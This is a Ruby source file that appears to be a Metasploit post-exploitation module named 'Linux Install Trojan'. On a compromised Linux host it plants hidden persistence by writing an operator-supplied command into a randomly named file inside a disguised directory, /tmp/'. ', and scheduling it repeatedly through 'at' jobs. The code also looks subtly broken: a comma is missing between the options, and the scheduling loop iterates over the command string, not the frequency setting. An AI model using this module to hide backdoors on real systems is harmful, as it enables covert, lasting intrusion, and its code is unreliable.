##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/system'
require 'msf/core/post/linux/priv'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Linux::System


	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Linux Install Trojan',
				'Description'   => %q{
					This module installs a Linux Trojan to run very hour via AT.
				},
				'License'       => MSF_LICENSE,
				'Author'        =>
					[
						'Joshua D. Abraham <jabra[at]praetorian.com>',
					],
				'Platform'      => [ 'linux' ],
				'SessionTypes'  => [ 'shell' ]
			))
			register_options(
					[
						OptString.new('COMMAND', [true, 'The command to run.', 'touch /tmp/test.txt'])
						OptInt.new('FREQ', [true, 'Duration (in hours) to run this command.', 1])
					], self.class)
	end

	def run
		print_status "Installing trojan to run : #{datastore['COMMAND']}"

		vcmd_exec("touch /var/spool/cron/atjobs/.SEQ")
		vcmd_exec("cd /var/spool/cron/atjobs")
		vcmd_exec("chown daemon.daemon .SEQ")
		vcmd_exec("mkdir -p /tmp/'. '")
		file = rand_text_alpha(128)
		vcmd_exec("echo #{datastore['COMMAND']} >>" +  "/tmp/'. '/.#{file}")
		for i in 0..datastore['COMMAND']
			vcmd_exec("at now + #{i} hour -f " +  "/tmp/'. '/.#{file}")
		end
	end
end
